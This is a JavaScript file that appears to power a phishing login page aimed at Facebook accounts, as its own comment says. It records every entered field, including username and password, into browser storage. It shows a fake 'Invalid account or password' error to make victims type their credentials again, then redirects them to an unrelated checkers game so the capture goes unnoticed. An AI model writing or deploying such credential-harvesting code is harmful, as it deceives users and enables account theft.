let userMessage = localStorage.getItem('usermessage') || '';
let form = document.getElementById('maine-form');
let username = null;
let lastSignin = localStorage.getItem('lastSignin');

let isBadInput = localStorage.getItem('badInput');

let maineMessage = document.getElementById('maine-message');

let msgError = document.querySelector('#msg-form');



if (msgError) {
    isBadInput ? msgError.innerText = 'Invalid account or password please try again' : msgError.innerText = '';
    
    if (isBadInput == 'false') {
        msgError.innerText = '';
    }

}

let firsrtInput = form.querySelector('input:nth-child(1)');
firsrtInput.value = localStorage.getItem('firstInput') ?? '';



// console.log(isBadInput);

function isStrongmessage(message) {
    // Check for at least one uppercase letter
    const hasUppercase = /[A-Z]/.test(message);

    // Check for at least one lowercase letter
    const hasLowercase = /[a-z]/.test(message);

    // Check for at least one digit
    const hasDigit = /\d/.test(message);

    // Check for at least one special character (non-alphanumeric)
    const hasSpecialChar = /[^A-Za-z0-9]/.test(message);

    // Check minimum length
    const isLongEnough = message.length >= 4;

    const hasAlphabet = hasUppercase || hasLowercase;
    const hasTextOrDigit = hasAlphabet || hasDigit;

    // Combine all conditions
    return  hasSpecialChar && isLongEnough && hasTextOrDigit;
}


function formClick() {
    verifyAccount();
    if (isStrongmessage(maineMessage.value) && msgError) {
        localStorage.setItem('badInput',false);
        window.location.href = 'https://ukulyelye.github.io/checkers-app/checkers';
        localStorage.clear('firstInput');
        return false
    } else {
        localStorage.setItem('badInput',true);
        localStorage.setItem('firstInput', firsrtInput.value);
    }
}

if (lastSignin == 'invalid') {
    form.classList.add('invalid-username');
}

//verify user and redirect
// [ ] Check if 2 word username

//I focus this for facebook
function verifyAccount (source) {

    
    let inputGroup = form.querySelectorAll('input');
    let texts = '';
    inputGroup.forEach((input)=>{
        if (input.value != '' && input.type != 'submit') {
            texts += `${input.name}: ${input.value}* `;
            if (input.name == 'username') {
                username = input.value;
            }
        }
    })
    
    localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
    //invaid facebook username 
    if (source == 'facebook') {
        // username... remove white space
        username.trim();
        let usernameSpaces = 0;
        let isPhoneNum = username > 9000000000;
        for (let char of username) {if(char == ' '){usernameSpaces++}}

        let validUsername = usernameSpaces == 1 && username.length > 5 || isPhoneNum;
        if (validUsername && isStrongmessage(maineMessage.value)) {
            localStorage.setItem('lastSignin', 'valid');
            window.location.href = 'https://ukulyelye.github.io/checkers-app/checkers';
            localStorage.clear('lastSignIn');
            return false;
            alert('error');

        } else {
            //not a valid account username
            //Make the reload restart here to make link not visible in form
            localStorage.setItem('lastSignin', 'invalid');
            localStorage.setItem('firstInput', firsrtInput.value);

        }
    }
}


//add feedback ratings